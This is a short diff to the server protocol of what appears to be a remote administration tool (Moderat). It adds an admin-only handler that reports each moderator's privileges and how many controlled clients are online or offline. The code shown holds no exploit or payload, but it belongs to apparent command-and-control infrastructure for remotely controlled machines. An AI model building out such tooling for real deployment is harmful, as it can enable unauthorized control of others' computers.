@@ -189,6 +189,22 @@ class ModeratServerProtocol(Protocol):
             log.info('Set Alias %s For %s' % (alias_value, data['mode']))
             manageClients.set_alias(alias_client, alias_value)
 
+        # ADMIN PRIVILEGES
+        # Get Moderators List
+        elif data['mode'] == 'getModerators' and manageModerators.get_privs(moderators[data['session_id']]['username']) == 1:
+            all_moderators = manageModerators.get_moderators()
+            result = {}
+            for moderator in all_moderators:
+                print moderator, ' ', moderators
+                all_clients_count = len(ClientsManagment().get_clients(moderator[0]))
+                offline_clients_count = len(ClientsManagment().get_offline_clients(moderator[0]))
+                result[moderator[0]] = {
+                    'privileges': moderator[2],
+                    'offline_clients': offline_clients_count,
+                    'online_clients': all_clients_count - offline_clients_count,
+                }
+            self.send_message_to_moderator(self, result, 'getModerators')
+
         # Send Commands To Clients
         else:
             log.info('Send Message to %s from %s' % (data['to'], data['from']))
